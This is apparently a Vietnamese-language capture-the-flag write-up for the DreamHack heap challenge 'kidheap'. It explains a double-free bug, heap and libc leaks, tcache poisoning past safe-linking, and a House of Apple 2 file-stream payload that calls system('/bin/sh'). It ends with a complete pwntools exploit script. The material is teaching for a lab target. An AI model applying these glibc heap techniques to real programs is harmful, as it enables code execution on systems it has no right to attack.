# kidheap---Write-up-----DreamHack
Hướng dẫn cách giải bài kidheap cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 17/4/2026

## 1. Mục tiêu cần làm
Những bài về **heap** và **Tcache Poisoning** thì các lớp phòng thủ thường không quan trọng lắm, bài này thì bật full hết luôn.

Giờ hãy đọc code bài này đã. Mình sẽ chỉ show ra các hàm dùng để thực thi lỗi thôi

```C
_BOOL8 sub_1543()
{
  _BOOL8 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx > ");
  v1 = sub_128E();
  if ( dword_40E0[v1] )
    puts("[!] Already deleted!");
  if ( !dword_40E0[v1] && qword_4060[v1] )
  {
    free(*(void **)(qword_4060[v1] + 24LL));
    free(*(void **)(qword_4060[v1] + 16LL));
    free((void *)qword_4060[v1]);
    puts("[*] Delete success!");
  }
  result = dword_40E0[v1] == 0;            // Lỗi double free
  dword_40E0[v1] = result;
  return result;
}
```

```C
int sub_17AD()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx > ");
  v1 = sub_128E();
  if ( dword_40E0[v1] )
    return puts("[!] Already deleted note.");
  if ( !qword_4060[v1] )
    return puts("[!] Not exist note.");
  printf("name : %s\n", *(const char **)(qword_4060[v1] + 16LL));
  return printf("content : %s\n", *(const char **)(qword_4060[v1] + 24LL));
}
```

Đầu tiên phân tích struct của bài. Struct có cấu trúc như sau

```C
// Kích thước tổng cộng của struct: 32 bytes (0x20 bytes)
struct Note {
    uint64_t size;         // +0x00: Kích thước của name (do người dùng nhập)
    uint64_t idx;          // +0x08: Chỉ số index của note (từ 0 đến 15)
    char* name_ptr;        // +0x10: Con trỏ tới chunk chứa Name (size tùy chọn)
    char* content_ptr;     // +0x18: Con trỏ tới chunk chứa Content (fix cứng 0x100)
};
```

Ở hàm in ra nó sẽ dựa vào con trỏ để in ra các giá trị, để in ra thì ta cần nó được cắm flag là true. Nhưng khi delete lần đầu thì cờ nó bị biến thành false tức là 0. Nhưng mình đã có ghi lỗi ở hàm đó rồi, khi ta delete lần 2, nó sẽ chỉ kiểm tra và in ra dòng `[!] Already deleted!` thôi chứ vẫn chỉnh lại cờ tức là nếu ta xóa 2 lần thì ta có thể vừa edit vừa in ra thằng đó.

Giờ bài này ta có 2 hướng giải quyết, 1 là ghi đè lên RIP để khi `exit` nó sẽ thực thi system hay one_gadget gì đó tùy bạn chọn, 2 là **FSOP**. Vì FS quá OP nên mình sẽ chọn cách 2. Mình sẽ thực hiện kĩ thuật **House Of Apple 2**, nghe quen không ? Đây là kĩ thuật mình sử dụng cho bài `FSisOP` các bạn có thể qua đó coi chi tiết cách kĩ thuật này hoạt động nha !

Giờ thì bắt tay vô làm thôi.

## 2. Cách thực thi
Để thực hiện **House Of Apple 2** ta chỉ cần thỏa mãn 2 yêu cầu. 1 là leak được libc và 2 là có thể ghi đè vào thằng `_IO_list_all` hoặc làm sao để có thể ghi vô nó.

Đầu tiên là leak heap. Khi mình delete 1 note, mình để ý là thằng đầu tiên ở `name` hay `content` là heap nhưng bị dịch 12 bit.

<img width="1449" height="533" alt="image" src="https://github.com/user-attachments/assets/da07e61f-94d3-4d72-8945-898a163c6cd2" />

Vậy thì ta sẽ delete thêm 1 lần nữa và print ra và dịch nó 12 bit là có heap rồi.

```Python
for i in range(9):        # tạo 8 note để tí leak libc
    add(i, 16, b"A", b"B")

delete(0)
delete(0)
name_leak, content_leak = show(0)
leak_heap = u64(content_leak.ljust(8, b'\x00'))
heap_base = leak_heap << 12
log.success(f'Heap Base : {hex(heap_base)}')
```

Tiếp theo là leak libc trước đi. Khi ta khởi tạo 1 note thì nó sẽ malloc cho ta tận 3 thằng đó là `Struct`, `Name` và `Content`. Khi ta xóa thì tất cả sẽ chui vô thằng `tcache` nhưng nó chỉ chứa tối đa được 7 thằng. Vậy ta cần tạo thêm 1 thằng và xóa nó, thằng đó nó sẽ chui vào `unsortedbin`. Tại đây 2 con trỏ `fd` và `bk` sẽ trỏ vào `main_arena`. Khi ta xóa nó lần nữa thì ta có quyền print nó ra, lúc này ta sẽ print ra vị trí của `main_arena` aka leak libc.

```Python
for i in range(1, 7):
    delete(i)

delete(7)
delete(7)
name_leak, content_leak = show(7)
leak_libc = u64(content_leak.ljust(8, b'\x00'))
log.success(f'Leak main_arena+96 : {hex(leak_libc)}')
libc.address = leak_libc - 0x21ace0
log.success(f'Libc Base : {hex(libc.address)}')
```

Ok, sau khi có heap và libc ta sẽ bắt đầu cook bài này. Bởi vì ta không thể ghi đè vô vị trí của các `IO` nên ta sẽ đánh lừa nó nhảy vào thực thi ở 1 khu vực khác chứa sẵn payload của **House Of Apple 2**. Khi `exit`, nó sẽ nhìn vào `_IO_list_all` và lấy địa chỉ ở đó ra để duyệt các `IO` file còn lại. Vậy thì ta sẽ thay đổi giá trị địa chỉ trong `_IO_list_all` để trỏ vào vị trí payload của ta.

<img width="1743" height="219" alt="image" src="https://github.com/user-attachments/assets/48a0f4bf-3e07-47a3-933c-0b7e3c572faf" />

Đây là bin của chúng ta khi free hết 8 note, 0x20 là `Name`, 0x30 là `Struct` và 0x110 là `Content`. Ta sẽ sửa con trỏ tại `name` trỏ vào `_IO_list_all` thay vì trỏ vào `name` của thằng note khác.

```Python
io_list_all = libc.sym['_IO_list_all']
note_6_name_addr = heap_base + 0xc20
note_6_content_addr = heap_base + 0xb10
note_5_content_addr = heap_base + 0x9b0

mangled_io_list_all = (note_6_name_addr >> 12) ^ io_list_all
mangled_content_6_fd = (note_6_content_addr >> 12) ^ note_5_content_addr

edit(6, p64(mangled_io_list_all).ljust(16, b'\x00'), p64(mangled_content_6_fd))
```

Để chống lại nạn **Tcache Poisoning**, `Glibc` không lưu địa chỉ con trỏ thô vào `fd` nữa mà mã hóa nó theo công thức XOR : $$Mangled\_Ptr = (Pos \gg 12) \oplus Ptr$$. Vậy nên ta sẽ cần mã hóa nó đi để tránh bị văng.

Sau khi sửa xong note 6 thì nó sẽ trỏ vào `_IO_list_all`

<img width="1720" height="238" alt="image" src="https://github.com/user-attachments/assets/58f6de19-a22f-4760-8126-383a10a0fb0c" />

Giờ ta sẽ sửa note 0 lại để nó chứa payload độc của chúng ta

```Python
fake_struct_addr = heap_base + 0x2d0
io_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

payload = bytearray(b'\x00' * 0x100)
payload[0:8] = b'  /bin/sh'                                 
payload[0x18:0x20] = p64(0)                                 
payload[0x20:0x28] = p64(1)                                 
payload[0x68:0x70] = p64(system)                            
payload[0x88:0x90] = p64(fake_struct_addr + 0x50)           
payload[0xa0:0xa8] = p64(fake_struct_addr)                  
payload[0xc0:0xc8] = p64(1)                
payload[0xd8:0xe0] = p64(io_wfile_jumps)                 
payload[0xe0:0xe8] = p64(fake_struct_addr)

note_0_name_addr = heap_base + 0x3e0
mangled_name_0_fd = (note_0_name_addr >> 12) ^ 0
edit(0, p64(mangled_name_0_fd).ljust(16, b'\x00'), payload)
```

Cuối cùng ta cần tạo 1 note dummy để rút note 6 ra, khi đó nếu ta tạo note mới nữa thì nó sẽ rút note `_IO_list_all` ra để ta sửa. 

```Python
add(9, 16, b"pad", b"pad")

pause()

add(10, 16, p64(fake_struct_addr).ljust(16, b'\x00'), b"BOOM")
```

<img width="1398" height="277" alt="image" src="https://github.com/user-attachments/assets/234f4e96-8015-4bfb-b793-9388d7cc5941" />

Mình lỡ chạy lại chương trình nên số nó khác nhưng offset trong payload thì y chang nên các bạn khỏi lo. Mình đã sửa thành công địa chỉ `_IO_list_all` thành đầu note 0 nơi chứa payload mình. Và giờ chỉ cần exit là bùm nổ shell thôi.

Bài này khá là hay, nó là **Double Free** nhưng lại không phải là **Double Free**. Mình thắc mắc tại sao có người solve trong 30p nhưng giờ mình đã hiểu. Thôi thì cảm ơn các bạn đã đọc, hãy cho mình 1 star để có động lực viết write up tiếp nha 🐧.

## 3. Exploit
```Python
from pwn import *

e = ELF('./prob_patched')
libc = ELF('./libc.so.6')

p = process('./prob_patched')
#p = remote('host8.dreamhack.games', 8870)

def add(idx, name_size, name, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx > ', str(idx).encode())
    p.sendlineafter(b'name size > ', str(name_size).encode())
    p.sendafter(b'name > ', name)
    p.sendafter(b'content > ', content)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx > ', str(idx).encode())

def edit(idx, name, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx > ', str(idx).encode())
    p.sendafter(b'name > ', name)
    p.sendafter(b'content > ', content)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx > ', str(idx).encode())
    
    p.recvuntil(b'name : ')
    name = p.recvline()[:-1]
    
    p.recvuntil(b'content : ')
    content = p.recvline()[:-1]
    
    return name, content

for i in range(9):
    add(i, 16, b"A", b"B")

delete(0)
delete(0)
name_leak, content_leak = show(0)
leak_heap = u64(content_leak.ljust(8, b'\x00'))
heap_base = leak_heap << 12
log.success(f'Heap Base : {hex(heap_base)}')

for i in range(1, 7):
    delete(i)

delete(7)
delete(7)
name_leak, content_leak = show(7)
leak_libc = u64(content_leak.ljust(8, b'\x00'))
log.success(f'Leak main_arena+96 : {hex(leak_libc)}')
libc.address = leak_libc - 0x21ace0
log.success(f'Libc Base : {hex(libc.address)}')

delete(6) 

io_list_all = libc.sym['_IO_list_all']
note_6_name_addr = heap_base + 0xc20
note_6_content_addr = heap_base + 0xb10
note_5_content_addr = heap_base + 0x9b0

mangled_io_list_all = (note_6_name_addr >> 12) ^ io_list_all
mangled_content_6_fd = (note_6_content_addr >> 12) ^ note_5_content_addr

edit(6, p64(mangled_io_list_all).ljust(16, b'\x00'), p64(mangled_content_6_fd))

fake_struct_addr = heap_base + 0x2d0
io_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

payload = bytearray(b'\x00' * 0x100)
payload[0:8] = b'  /bin/sh'                                 
payload[0x18:0x20] = p64(0)                                 
payload[0x20:0x28] = p64(1)                                 
payload[0x68:0x70] = p64(system)                            
payload[0x88:0x90] = p64(fake_struct_addr + 0x50)           
payload[0xa0:0xa8] = p64(fake_struct_addr)                  
payload[0xc0:0xc8] = p64(1)                
payload[0xd8:0xe0] = p64(io_wfile_jumps)                 
payload[0xe0:0xe8] = p64(fake_struct_addr)

note_0_name_addr = heap_base + 0x3e0
mangled_name_0_fd = (note_0_name_addr >> 12) ^ 0
edit(0, p64(mangled_name_0_fd).ljust(16, b'\x00'), payload)

add(9, 16, b"pad", b"pad")

pause()

add(10, 16, p64(fake_struct_addr).ljust(16, b'\x00'), b"BOOM")

pause()

p.sendlineafter(b'> ', b'5')

p.interactive()
```
